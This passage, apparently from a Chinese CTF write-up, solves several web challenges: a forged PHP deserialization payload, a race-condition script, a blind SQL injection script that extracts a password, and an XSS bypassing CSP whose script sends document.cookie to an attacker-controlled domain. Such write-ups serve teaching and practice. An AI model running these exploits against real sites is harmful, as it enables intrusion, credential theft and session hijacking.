<p>Monster类的encryptKey是由Game的encryptKey经过运算而来的，而后者的encryptKey我们已经通过格式化字符串的方式泄露出来了。</p>
<p>那么此时就要找反序列化可以利用的地方了，由于我们需要让排名为第一，根据审计发现，只要使得$_SESSION[‘rank’]的值为1就好了，利用的位置就在下面：</p>
<p><img src="/images/e1de0fb/web-1-8.png" alt="8"></p>
<p>这是Rank类的析构函数，对象销毁时会自动调用，这里把rank修改了，我们只需要使得反序列化得到一个Rank对象，并且其rank属性为1即可。但是这里有个判断，<code>$this-&gt;key === $this-&gt;serverKey</code>，但我们不知道<code>$_SERVER[&#39;key&#39;]</code>到底是什么，无法给<code>$this-&gt;key</code>填正确的值，那么就不填了！</p>
<p><img src="/images/e1de0fb/web-1-9.png" alt="9"></p>
<p>因为这个$key属性是有默认值的，如果反序列化的时候发现少了属性，就会填上这个默认值，而这个默认值就是正确的key。</p>
<p>那么现在要构造数据了，要使得反序列化得出想要的结果，那么就把想要的结果序列化就好了！</p>
<p>php代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span><span class="token punctuation">;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%s'</span><span class="token punctuation">;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$enc_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$enc_key</span> <span class="token operator">.=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$enc_key</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token variable">$enc_key</span><span class="token punctuation">;</span>  <span class="token comment">//Monster类的encryptKey</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Rank</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$rank</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$serverKey</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//var_dump(serialize($a));</span>

<span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$enc_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行<code>php exp.php</code>（文件名是exp.php）</p>
<p><img src="/images/e1de0fb/web-1-10.png" alt="10"></p>
<p>然后放到cookie里，发送请求，可看到flag：</p>
<p><img src="/images/e1de0fb/web-1-1.png" alt=""></p>
<p>根据exp，还要注意的是：post的player要对应为<code>%s</code>。</p>
<hr>
<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><p>这题一开始以为是注入，发现搞了好久都不行。而且是高价买入，低价卖出（被收手续费），根本不可能赚够钱买flag。然后想到，既然是交易系统，就很可能存在多线程竞争的漏洞。</p>
<p>大概意思是，买入1个货物，多个线程几乎同时发送请求来出售1个货物，网站查询数据库获得货物数量为1，一个线程还没来得及把货物数量减1存入数据库，另一个线程就从数据库查到货物数量为1，导致多个线程都判断货物数量充足，这样就造成了1个货物，出售了多次，这样就可以获得多于1个货物的价钱了。同理，我们可以买入10个甚至500个（经检验一次最多出售500个），然后多个线程同时出售买入的货物数量。</p>
<p>下面是exp的一次运行结果：</p>
<p><img src="/images/e1de0fb/web-2-1.png" alt="1"></p>
<p>可以看到，我只买入了一次，却出售了多次</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

<span class="token triple-quoted-string string">"""
记得调整买入卖出的数量，就是在你买得起的前提下，买最多货物
"""</span>

<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread
<span class="token keyword">import</span> requests

hds <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token comment"># Cookie记得换成自己的</span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=3gclac3safjutrm5pjfpi0n7n7'</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">buy_job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""买入"""</span>
    url <span class="token operator">=</span> <span class="token string">'http://121.36.88.65:9999/API/?method=buy'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span><span class="token string">'800002'</span><span class="token punctuation">,</span> <span class="token comment"># 货物代号，这个货价格最高</span>
        <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span> <span class="token comment"># 买入500个</span>
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>hds<span class="token punctuation">)</span>
    ret <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve_job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""出售"""</span>
    url <span class="token operator">=</span> <span class="token string">'http://121.36.88.65:9999/API/?method=solve'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span><span class="token string">'800002'</span><span class="token punctuation">,</span>
        <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token string">'500'</span> <span class="token comment"># 出售数量</span>
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>hds<span class="token punctuation">)</span>
    ret <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>


buy_job<span class="token punctuation">(</span><span class="token punctuation">)</span>

num <span class="token operator">=</span> <span class="token number">10</span> <span class="token comment"># 10个线程同时出售</span>
jobs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    jobs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>solve_job<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
    j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> jobs<span class="token punctuation">:</span>
    j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这exp不是傻瓜式的，多运行几次赚够钱了，自己在浏览器上拿flag</p>
<hr>
<h3 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h3><p>sql时间盲注，注入点在删除留言的请求参数delete_id里：</p>
<p><img src="/images/e1de0fb/web-3-1.png" alt="1"></p>
<p>不过好像有个奇怪的现象，必须得有1条留言以上，才可以注入，否则好像根本不会进行sql语句的执行</p>
<p>注入的基本payload格式为：</p>
<p><code>?method=delete&amp;delete_id=1 or if((条件),sleep(1),0)</code></p>
<p>首先这个id为1，是一个根本不存在的留言的id，如果存在的话，or的表达式必为真，这是个短路运算，根本不会执行后面那个语句，顺带说一句为什么要用or不用and，如果用and，and后面的表达式想要执行，and前面的表达式一定要为真，也就是id必须存在，如果测试的时候and后面也为真，这条留言就被删掉了，想要再注入，又得再创建一条留言了。</p>
<p>下面是我的exp（记得要先添加一条留言，并且把cookie换成自己的）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

<span class="token keyword">from</span> requests <span class="token keyword">import</span> get
<span class="token keyword">from</span> time <span class="token keyword">import</span> time

hds <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=jrnn9tvdn7pmnel08b3gt1jug0'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""返回请求的时间"""</span>
    start <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>hds<span class="token punctuation">)</span>
    end <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> end<span class="token operator">-</span>start

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">,</span> format_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""二分法爆破"""</span>
    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
        <span class="token comment">#print(left,right)</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        url <span class="token operator">=</span> format_url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">if</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1.8</span><span class="token punctuation">:</span>
            right <span class="token operator">=</span> mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">return</span> left

<span class="token keyword">def</span> <span class="token function">get_dbname_len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""获取数据库名长度"""</span>
    format_url <span class="token operator">=</span> <span class="token string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if((length(database())>&#123;&#125;),sleep(2),0)'</span>
    left <span class="token operator">=</span> <span class="token number">0</span>
    right <span class="token operator">=</span> <span class="token number">64</span>

    <span class="token keyword">return</span> test<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> format_url<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_dbname</span><span class="token punctuation">(</span>dbname_len<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""获取数据库的名字"""</span>
    format_url <span class="token operator">=</span> <span class="token string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if(((ascii(substr(database(),&#123;&#125;,1)))>&#123;&#125;),sleep(2),0)'</span>
    dbname <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> dbname_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> format_url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
        dbname <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        <span class="token comment">#print(dbname)</span>
    <span class="token keyword">return</span> dbname

<span class="token keyword">def</span> <span class="token function">get_tbnames</span><span class="token punctuation">(</span>tb_lens<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""获取当前数据库的表的名字"""</span>
    format_url <span class="token operator">=</span> <span class="token string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if(((ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()+limit+&#123;&#125;,1),&#123;&#125;,1)))>&#123;&#125;),sleep(2),0)'</span>
    tbnames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tb_lens<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tb_lens<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> format_url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">)</span>
            ret <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
            name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
        tbnames<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> tbnames

<span class="token keyword">def</span> <span class="token function">get_table_cols</span><span class="token punctuation">(</span>tbname<span class="token punctuation">,</span> col_lens<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""获取表的列的名字"""</span>
    format_url <span class="token operator">=</span> <span class="token string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if((ascii(substr(((select+column_name+from+information_schema.columns+where+table_name%3d'&#123;&#125;'+limit+&#123;&#125;,1)),&#123;&#125;,1))>&#123;&#125;),sleep(2),0)"</span>
    cols <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>col_lens<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        col <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> col_lens<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            url <span class="token operator">=</span> format_url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>tbname<span class="token punctuation">,</span> i<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">)</span>
            ret <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
            col <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span>
        cols<span class="token punctuation">.</span>append<span class="token punctuation">(</span>col<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cols




dbname_len <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment"># get_dbname_len()</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'dbname_len=%d'</span> <span class="token operator">%</span> dbname_len<span class="token punctuation">)</span>

dbname <span class="token operator">=</span> <span class="token string">'babysql'</span> <span class="token comment"># get_dbname(dbname_len)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'dbname=%s'</span> <span class="token operator">%</span> dbname<span class="token punctuation">)</span>

tables_len <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token comment"># 表名的长度</span>
tbnames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token comment"># get_tbnames(tables_len)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>tbnames<span class="token punctuation">)</span>

user_col_lens <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token comment"># 列的名称的长度</span>
cols <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token comment"># get_table_cols('user', user_col_lens)</span>

<span class="token comment"># 查询user表id为1的数据的name列</span>
name_len <span class="token operator">=</span> <span class="token number">6</span>
url <span class="token operator">=</span> <span class="token string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if((ascii(substr((select+name+from+user+where+id%3d1),&#123;&#125;,1))>&#123;&#125;),sleep(2),0)'</span>
name <span class="token operator">=</span> <span class="token string">''</span>

<span class="token triple-quoted-string string">"""
for pos in range(1, name_len+1):
    ret = test(0, 256, url.format(pos, '&#123;&#125;'))
    name += chr(ret)
    print(name)
"""</span>
name <span class="token operator">=</span> <span class="token string">'cosmos'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name=%s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>


<span class="token comment"># user表id为1的数据的password列</span>
password_len <span class="token operator">=</span> <span class="token number">28</span>
url <span class="token operator">=</span> <span class="token string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=1+or+if((ascii(substr((select+password+from+user+where+id%3d1),&#123;&#125;,1))>&#123;&#125;),sleep(2),0)'</span>
password <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> password_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> <span class="token string">'&#123;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    password <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'password=%s'</span> <span class="token operator">%</span> password<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp中会发现有些函数调用被我注释掉了，那是因为我exp不是一步写成的，比如：写了get_dbname_len然后调用，运行exp后得到数据库长度后，才进行了下一步，既然已经得到长度了，那下一步运行exp的时候就没必要再跑一次get_dbname_len函数了（虽然最后发现，数据库名字并不重要）</p>
<p>得出用户名和密码后，登录可以看到flag（我记得是这样的）</p>
<hr>
<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>和week2的那题相比多了CSP的限制，具体可看这篇文章<a href="https://blog.csdn.net/qq_37943295/article/details/79978761">https://blog.csdn.net/qq_37943295/article/details/79978761</a></p>
<p><img src="/images/e1de0fb/web-4-1.png" alt="1"></p>
<p>根据题目可知道，像img、script的标签的src属性，不是这个网站的url，都不会执行。</p>
<p>首先要清楚的是，在这个CSP的限制下，不符合规则的，就算注入到页面了，也没有用，因为不会执行。</p>
<p>我们可以注入一个script标签，如<code>&lt;script src=xxx&gt;&lt;/script&gt;</code>，script的代码是通过src指定的url去获取，我们只要找到一个url，这个url是属于这个网站的，并且返回的内容是可控的，那么就可以达到效果。</p>
<p>巧儿，这个url刚刚好就是发送消息的请求url：</p>
<p><img src="/images/e1de0fb/web-4-2.png" alt="2"></p>
<p>我们只要把js代码通过message这个参数传入就可以了。</p>
<p>题目还过滤了script这个单词（大小写均过滤），可以双写绕过。</p>
<p>那么最后payload就是：</p>
<p><code>&lt;scriscriptpt src=&#39;/send?message=js代码&#39;&gt;&lt;/scrscriptipt&gt;</code></p>
<p>可以参考下我的js代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    windows<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://你的域名/?token='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>记得url编码后再添加到<code>message=</code>后面，我的exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 获取验证码前6位md5值</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat-v2.hgame.babelfish.ink/code'</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

    code <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>

    <span class="token comment"># 之前测试过，破解出来的都是8位数，所以这里直接从8位数开始</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">99999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat-v2.hgame.babelfish.ink/send'</span>
    payload <span class="token operator">=</span> <span class="token string">r"?message=&lt;sscriptcript+src%3d'send%3fmessage%3d&#123;你的js代码两次url编码后&#125;'&lt;/sscriptcript>"</span>
    url <span class="token operator">+=</span> payload
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r

<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat-v2.hgame.babelfish.ink/submit'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span>code
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r


url <span class="token operator">=</span> <span class="token string">'http://c-chat-v2.hgame.babelfish.ink/'</span>


s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 访问一下url得到cookie</span>
r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

<span class="token comment"># 获取验证码</span>
code <span class="token operator">=</span> get_code<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'code='</span><span class="token operator">+</span>code<span class="token punctuation">)</span>

<span class="token comment"># 发送构造好的payload</span>
r <span class="token operator">=</span> send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token comment"># 提交验证码，让刚刚的payload生效</span>
r <span class="token operator">=</span> submit<span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
